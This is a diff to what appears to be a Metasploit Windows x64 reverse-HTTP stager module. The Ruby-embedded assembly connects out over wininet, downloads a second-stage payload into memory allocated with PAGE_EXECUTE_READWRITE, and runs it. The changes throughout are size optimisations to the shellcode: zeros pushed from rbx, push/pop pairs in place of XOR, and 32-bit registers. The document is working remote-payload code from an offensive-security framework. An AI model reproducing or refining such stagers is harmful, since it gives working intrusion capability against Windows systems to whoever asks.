@@ -198,8 +198,10 @@ module Payload::Windows::ReverseHttp_x64
     end
 
     asm = %Q^
+      xor rbx, rbx
+
       load_wininet:
-        push 0
+        push rbx
         mov r14, 'wininet'
         push r14                      ; Push 'wininet',0 onto the stack
         mov r14, rsp                  ; Save pointer to string
@@ -222,17 +224,19 @@ module Payload::Windows::ReverseHttp_x64
     else
       asm << %Q^
         xor r8, r8                    ; NULL pointer (lpszProxyName)
-        xor rdx, rdx                  ; PRECONFIG = 0 (dwAccessType)
+        ; the push/pop sequence saves a byte over XOR
+        push rbx
+        pop rdx                       ; PRECONFIG = 0 (dwAccessType)
       ^
     end
 
     asm << %Q^
-        push 0                        ; alignment
-        push 0                        ; NULL pointer
+        push rbx                      ; 0 for alignment
+        push rbx                      ; 0 for alignment
         xor r9, r9                    ; NULL pointer (lpszProxyBypass)
         mov rcx, rsp                  ; Empty string pointer (lpszAgent)
-        push 0                        ; 0 (dwFlags)
-        push 0                        ; alignment
+        push rbx                      ; 0 (dwFlags)
+        push rbx                      ; 0 for alignment
         mov r10, 0xA779563A           ; hash( "wininet.dll", "InternetOpenA" )
         call rbp
     ^
@@ -247,10 +251,10 @@ module Payload::Windows::ReverseHttp_x64
         mov rcx, rax                  ; HINTERNET (hInternet)
         mov r8, #{opts[:port]}        ; 
         xor r9, r9                    ; String (lpszUsername)
-        push 0                        ; NULL (dwContext)
-        push 0                        ; 0 (dwFlags)
+        push rbx                      ; NULL (dwContext)
+        push rbx                      ; 0 (dwFlags)
         push 3                        ; INTERNET_SERVICE_HTTP (dwService)
-        push 0                        ; alignment
+        push rbx                      ; 0 for alignment
         mov r10, 0xC69F8957           ; hash( "wininet.dll", "InternetConnectA" )
         call rbp
     ^
@@ -277,8 +281,8 @@ module Payload::Windows::ReverseHttp_x64
         pop r9
         mov r10, 0x869E4675           ; hash( "wininet.dll", "InternetSetOptionA" )
         ; TODO: Without these pushes, things crashed. Not sure why.
-        push 0                        ; alignment
-        push 0                        ; alignment
+        push rbx                      ; 0 for alignment
+        push rbx                      ; 0 for alignment
         call rbp
         ^
       end
@@ -297,8 +301,8 @@ module Payload::Windows::ReverseHttp_x64
         pop r9
         mov r10, 0x869E4675           ; hash( "wininet.dll", "InternetSetOptionA" )
         ; TODO: Without these pushes, things crashed. Not sure why.
-        push 0                        ; alignment
-        push 0                        ; alignment
+        push rbx                      ; 0 for alignment
+        push rbx                      ; 0 for alignment
         call rbp
         ^
       end
@@ -318,9 +322,11 @@ module Payload::Windows::ReverseHttp_x64
       httpopenrequest:
         pop r8                        ; String (lpszObjectName)
         mov rcx, rax                  ; HINTERNET (hConnect)
-        xor rdx, rdx                  ; NULL pointer (lpszVerb)
+        ; the push/pop sequence saves a byte over XOR
+        push rbx
+        pop rdx                       ; NULL pointer (lpszVerb)
         xor r9, r9                    ; String (lpszVersion)
-        push 0                        ; 0 (dwContext)
+        push rbx                      ; 0 (dwContext)
         ; TODO: figure out what's going on here (get help from HD?)
         ; Having to use mov + push instead of push qword because
         ; Metasm doesn't seem to like it. Plain 'push' doesn't work
@@ -328,8 +334,8 @@ module Payload::Windows::ReverseHttp_x64
         ;push qword 0x#{http_open_flags.to_s(16)}  ; (dwFlags)
         mov r10, 0x#{http_open_flags.to_s(16)}  ; (dwFlags)
         push r10
-        push 0                        ; NULL pointer (lplpszAcceptTypes)
-        push 0                        ; NULL pointer (lpszReferer)
+        push rbx                      ; NULL pointer (lplpszAcceptTypes)
+        push rbx                      ; NULL pointer (lpszReferer)
         mov r10, 0x3B2E55EB           ; hash( "wininet.dll", "HttpOpenRequestA" )
         call rbp
         mov rsi, rax                  ; Store the request handle in RSI
@@ -347,7 +353,7 @@ module Payload::Windows::ReverseHttp_x64
         mov rcx, rsi                  ; (hInternet)
         push 31                       ; INTERNET_OPTION_SECURITY_FLAGS
         pop rdx
-        push 0                        ; alignment
+        push rbx                      ; 0 for alignment
         push #{set_option_flags}      ; (dwFlags)
         mov r8, rsp
         push 4                        ; sizeof(dwFlags)
@@ -360,18 +366,20 @@ module Payload::Windows::ReverseHttp_x64
     asm << %Q^
       httpsendrequest:
         mov rcx, rsi                  ; HINTERNET (hRequest)
-        xor rdx, rdx                  ; NULL pointer (lpszHeaders)
+        ; the push/pop sequence saves a byte over XOR
+        push rbx
+        pop rdx                       ; NULL pointer (lpszHeaders)
         xor r8, r8                    ; 0 (dwHeadersLength)
         xor r9, r9                    ; NULL pointer (lpOptional)
-        push 0                        ; alignment
-        push 0                        ; 0 (dwOptionalLength)
+        push rbx                      ; 0 for alignment
+        push rbx                      ; 0 (dwOptionalLength)
         mov r10, 0x7B18062D           ; hash( "wininet.dll", "HttpSendRequestA" )
         call rbp
-        test rax,rax
+        test eax, eax                 ; use eax, it's 1 byte less than rax
         jnz allocate_memory
 
       try_it_again:
-        dec rdi
+        dec edi                       ; use edi, it's 1 byte less than rdi
         jz failure
         jmp retry
     ^
@@ -391,10 +399,13 @@ module Payload::Windows::ReverseHttp_x64
 
     asm << %Q^
       allocate_memory:
-        xor rcx, rcx                ; NULL pointer (lpAddress)
+        ; the push/pop sequence saves a byte over XOR
+        push rbx
+        pop rcx                     ; NULL pointer (lpAddress)
         mov rdx, 0x00400000         ; SIZE_T (dwSize)
         mov r8, 0x1000              ; MEM_COMMIT (flAllocationType)
-        mov r9, 0x40                ; PAGE_EXECUTE_READWRITE (flProtect)
+        push 0x40
+        pop r9                      ; PAGE_EXECUTE_READWRITE (flProtect)
         mov r10, 0xE553A458         ; hash( "kernel32.dll", "VirtualAlloc" )
         call rbp                    ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
@@ -416,10 +427,11 @@ module Payload::Windows::ReverseHttp_x64
         test eax, eax               ; did the download fail?
         jz failure
 
-        mov ax, word ptr [edi]
-        add rbx, rax                ; buffer += lpNumberOfBytesRead
+        mov ax, word ptr [rdi]
+        ; Use ebx/eax here because we save bytes (don't need higher order 32 bits)
+        add ebx, eax                ; buffer += lpNumberOfBytesRead
 
-        test rax, rax
+        test eax, eax               ; use eax instead of rax, saves a byte
         jnz download_more           ; loop until 0 is returned
         pop rax                     ; clear temp storage
         pop rax                     ; alignment
